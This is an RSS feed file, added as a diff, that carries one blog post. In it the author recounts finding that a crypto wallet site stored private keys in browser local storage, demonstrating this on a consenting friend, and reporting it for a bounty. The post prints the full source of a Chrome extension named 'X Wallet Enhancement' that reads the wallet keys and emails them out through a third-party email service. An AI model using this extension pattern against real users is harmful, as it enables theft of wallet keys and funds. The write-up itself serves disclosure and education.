@@ -1,0 +1,124 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+  <channel>
+    <title>Andrey Krisanov - blockchain</title>
+    <link>https://akrisanov.com</link>
+    <description>Software engineer writing about production LLM inference, AI infrastructure, distributed systems, Kubernetes, vLLM, and platform reliability.</description>
+    <generator>Zola</generator>
+    <language>en</language>
+    <atom:link href="https://akrisanov.com/tags/blockchain/rss.xml" rel="self" type="application/rss+xml" />
+    
+    <lastBuildDate>Sat, 05 Aug 2023 00:00:00 +0000</lastBuildDate>
+    
+
+    
+    <item>
+      <title>Accidentally found a vulnerability in a crypto wallet and made $1,000</title>
+      <pubDate>Sat, 05 Aug 2023 00:00:00 +0000</pubDate>
+      <author>Andrey Krisanov</author>
+      <link>https://akrisanov.com/crypto-wallet-vulnerability/</link>
+      <guid>https://akrisanov.com/crypto-wallet-vulnerability/</guid>
+      <description xml:base="https://akrisanov.com/crypto-wallet-vulnerability/"><![CDATA[
+        <p>Published: 2023-08-05</p>
+        
+        
+          <p>In January 2022, I joined the community of one of the proof-of-stake blockchains.
+To play with what the protocol and its ecosystem offered, I created a wallet account on
+the official website <code>https://wallet.****.org</code>. Apart from general curiosity, I was interested in
+how they achieved security in a browser, especially in the age of extensions and
+client-side vulnerabilities.</p>
+<p>It turned out that when a user logged in, the wallet application (built in React) generated a set
+of public and private keys and stored them in the browser's local storage. With my experience of
+building authentication and authorization in distributed systems, I knew this was not the best
+thing to do – in general, it's easy for a browser extension and client-side code to read data
+from local storage <sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
+<p>To prove this, I decided to <a rel="noopener external" target="_blank" href="https://developer.chrome.com/docs/extensions/mv3/getstarted/development-basics/">write a simple extension for Chrome</a> that would retrieve keys from a victim's browser and send them to my
+anonymous email address.</p>
+<p>The root directory of my pickpocket extension looked like this:</p>
+<pre class="giallo" style="color-scheme: light dark; color: light-dark(#4C4F69, #CDD6F4); background-color: light-dark(#EFF1F5, #1E1E2E);"><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#D20F39, #F38BA8);font-style: italic;">.</span></span>
+<span class="giallo-l"><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">├──</span><span style="color: light-dark(#40A02B, #A6E3A1);"> content.js</span></span>
+<span class="giallo-l"><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">├──</span><span style="color: light-dark(#40A02B, #A6E3A1);"> email.min.js</span></span>
+<span class="giallo-l"><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">├──</span><span style="color: light-dark(#40A02B, #A6E3A1);"> index.html</span></span>
+<span class="giallo-l"><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">└──</span><span style="color: light-dark(#40A02B, #A6E3A1);"> manifest.json</span></span></code></pre>
+<p>The main files are the <code>manifest.json</code> and <code>content.js</code>. The former is essential for installing the extension.</p>
+<pre class="giallo" style="color-scheme: light dark; color: light-dark(#4C4F69, #CDD6F4); background-color: light-dark(#EFF1F5, #1E1E2E);"><code data-lang="json"><span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">{</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">  &quot;</span><span style="color: light-dark(#1E66F5, #89B4FA);">name</span><span style="color: light-dark(#7C7F93, #9399B2);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">:</span><span style="color: light-dark(#40A02B, #A6E3A1);"> &quot;</span><span style="color: light-dark(#40A02B, #A6E3A1);">X Wallet Enhancement</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">  &quot;</span><span style="color: light-dark(#1E66F5, #89B4FA);">version</span><span style="color: light-dark(#7C7F93, #9399B2);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">:</span><span style="color: light-dark(#40A02B, #A6E3A1);"> &quot;</span><span style="color: light-dark(#40A02B, #A6E3A1);">1.0</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">  &quot;</span><span style="color: light-dark(#1E66F5, #89B4FA);">manifest_version</span><span style="color: light-dark(#7C7F93, #9399B2);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">:</span><span style="color: light-dark(#FE640B, #FAB387);"> 3</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">  &quot;</span><span style="color: light-dark(#1E66F5, #89B4FA);">content_scripts</span><span style="color: light-dark(#7C7F93, #9399B2);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">:</span><span style="color: light-dark(#7C7F93, #9399B2);"> [</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">    {</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">      &quot;</span><span style="color: light-dark(#1E66F5, #89B4FA);">matches</span><span style="color: light-dark(#7C7F93, #9399B2);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">:</span><span style="color: light-dark(#7C7F93, #9399B2);"> [</span></span>
+<span class="giallo-l"><span style="color: light-dark(#40A02B, #A6E3A1);">        &quot;</span><span style="color: light-dark(#40A02B, #A6E3A1);">https://wallet.****.org/*</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">      ]</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">      &quot;</span><span style="color: light-dark(#1E66F5, #89B4FA);">js</span><span style="color: light-dark(#7C7F93, #9399B2);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">:</span><span style="color: light-dark(#7C7F93, #9399B2);"> [</span></span>
+<span class="giallo-l"><span style="color: light-dark(#40A02B, #A6E3A1);">        &quot;</span><span style="color: light-dark(#40A02B, #A6E3A1);">email.min.js</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#40A02B, #A6E3A1);">        &quot;</span><span style="color: light-dark(#40A02B, #A6E3A1);">content.js</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">      ]</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">    }</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">  ]</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">}</span></span></code></pre>
+<p><code>email.min.js</code> is just a client library from one of the cloud services that allows you to send
+email directly from a browser without any server code. <code>index.html</code> is a blank HTML page that
+displays nothing. The wallet hijacking logic lived in the <code>content.js</code> file:</p>
+<pre class="giallo" style="color-scheme: light dark; color: light-dark(#4C4F69, #CDD6F4); background-color: light-dark(#EFF1F5, #1E1E2E);"><code data-lang="javascript"><span class="giallo-l"><span>emailjs</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">init</span><span>(</span><span style="color: light-dark(#40A02B, #A6E3A1);">&#39;</span><span style="color: light-dark(#40A02B, #A6E3A1);">user_****</span><span style="color: light-dark(#40A02B, #A6E3A1);">&#39;</span><span>)</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;"> //</span><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;"> instantiating an email delivery service</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#8839EF, #CBA6F7);">let</span><span> templateParams</span><span style="color: light-dark(#179299, #94E2D5);"> =</span><span style="color: light-dark(#7C7F93, #9399B2);"> {</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;">    //</span><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;"> gathering information about the victim&#39;s browser</span></span>
+<span class="giallo-l"><span>    from_name</span><span style="color: light-dark(#179299, #94E2D5);">:</span><span> navigator</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span>userAgent</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;">    //</span><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;"> fetching wallet keys from the local storage</span></span>
+<span class="giallo-l"><span>    storage</span><span style="color: light-dark(#179299, #94E2D5);">:</span><span> window</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span>localStorage</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">getItem</span><span>(</span><span style="color: light-dark(#40A02B, #A6E3A1);">&#39;</span><span style="color: light-dark(#40A02B, #A6E3A1);">_*:wallet:active_account_id_**</span><span style="color: light-dark(#40A02B, #A6E3A1);">&#39;</span><span>)</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);">}</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;">//</span><span style="color: light-dark(#7C7F93, #9399B2);font-style: italic;"> using a prepared email template to send an email with keys</span></span>
+<span class="giallo-l"><span style="color: light-dark(#8839EF, #CBA6F7);">const</span><span> serviceID</span><span style="color: light-dark(#179299, #94E2D5);"> =</span><span style="color: light-dark(#40A02B, #A6E3A1);"> &#39;</span><span style="color: light-dark(#40A02B, #A6E3A1);">service_****</span><span style="color: light-dark(#40A02B, #A6E3A1);">&#39;</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span></span>
+<span class="giallo-l"><span style="color: light-dark(#8839EF, #CBA6F7);">const</span><span> templateID</span><span style="color: light-dark(#179299, #94E2D5);"> =</span><span style="color: light-dark(#40A02B, #A6E3A1);"> &#39;</span><span style="color: light-dark(#40A02B, #A6E3A1);">template_****</span><span style="color: light-dark(#40A02B, #A6E3A1);">&#39;</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>emailjs</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">send</span><span>(</span><span>serviceID</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span><span> templateID</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span><span> templateParams</span><span>)</span></span>
+<span class="giallo-l"><span style="color: light-dark(#179299, #94E2D5);"> .</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">then</span><span>(</span><span style="color: light-dark(#7C7F93, #9399B2);">(</span><span style="color: light-dark(#7C7F93, #9399B2);">)</span><span style="color: light-dark(#8839EF, #CBA6F7);"> =&gt;</span><span style="color: light-dark(#7C7F93, #9399B2);"> {</span></span>
+<span class="giallo-l"><span>    console</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">log</span><span>(</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span><span style="color: light-dark(#40A02B, #A6E3A1);">Wallet keys were send!</span><span style="color: light-dark(#40A02B, #A6E3A1);">&quot;</span><span>)</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);"> }</span><span style="color: light-dark(#7C7F93, #9399B2);">,</span><span style="color: light-dark(#7C7F93, #9399B2);"> (</span><span style="color: light-dark(#E64553, #EBA0AC);font-style: italic;">err</span><span style="color: light-dark(#7C7F93, #9399B2);">)</span><span style="color: light-dark(#8839EF, #CBA6F7);"> =&gt;</span><span style="color: light-dark(#7C7F93, #9399B2);"> {</span></span>
+<span class="giallo-l"><span>    console</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">error</span><span>(</span><span style="color: light-dark(#FE640B, #FAB387);">JSON</span><span style="color: light-dark(#179299, #94E2D5);">.</span><span style="color: light-dark(#1E66F5, #89B4FA);font-style: italic;">stringify</span><span>(</span><span>err</span><span>)</span><span>)</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span></span>
+<span class="giallo-l"><span style="color: light-dark(#7C7F93, #9399B2);"> }</span><span>)</span><span style="color: light-dark(#7C7F93, #9399B2);">;</span></span></code></pre>
+<p>Yes, such a dummy script.</p>
+<p>I packed all four files into a zip archive and kindly asked my friend, who also had
+a wallet at <code>https://wallet.***.org</code>, to install my creation in his browser
+(pretending to do some social engineering). Before doing so, I told him about my findings and
+the theory I was trying to prove. He was happy to help, and the public and private keys of
+this wallet account appeared in my inbox a few seconds after the browser extension was installed.
+Next, I saved the keys to local storage in my browser and opened the wallet website.</p>
+<p>Surprisingly, my friend's crypto-wallet balance was available to me, along with an option to
+withdraw the funds. During a Zoom call with my victim friend, I transferred some of his funds to
+an anonymous account and back. It was mind-blowing! A new, promising blockchain that had recently
+closed an investment round had a major vulnerability in its wallet. Worst of all, they had 2-factor
+authentication for users. Of course, not many people would activate it right away, and many didn't.</p>
+<p>As an ethical developer, I created a vulnerability report, including the source code of
+the browser extension and my thoughts on how to improve the security of the web application.
+It was sent directly to the security team's email address on 18th of January. A few days later,
+I had a call with the CISO of the blockchain protocol, who assured me that they were aware of
+the issue and would address it in the next release. I was a little disappointed with the speed of
+the response to the incident. Two days is an eternity when one speaks about users' money.
+Nevertheless, the blockchain developers granted me their tokens in an amount equivalent to 1,000 USDT.</p>
+<div class="callout callout-danger">
+<strong>Advice for application developers</strong>: be aware of the technologies you use and their security aspects.
+</div>
+<div class="callout callout-warning">
+<strong>Advice for crypto users</strong>: learn what security options an organisation offers to you,
+activate two-factor authentication as soon as you create a wallet account, don't store all of
+your funds in hot wallets.
+</div>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p>Worth reading:</p>
+</div>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://snyk.io/blog/is-localstorage-safe-to-use/">Is LocalStorage safe to use? | Snyk</a></li>
+<li><a rel="noopener external" target="_blank" href="https://www.rdegges.com/2018/please-stop-using-local-storage/">Please Stop Using Local Storage</a></li>
+<li><a rel="noopener external" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">Using HTTP cookies - HTTP | MDN</a></li>
+<li><a rel="noopener external" target="_blank" href="https://owasp.org/www-community/HttpOnly">HttpOnly | OWASP Foundation</a></li>
+</ul>
+
+        
+      ]]></description>
+    </item>
+    
+  </channel>
+</rss>
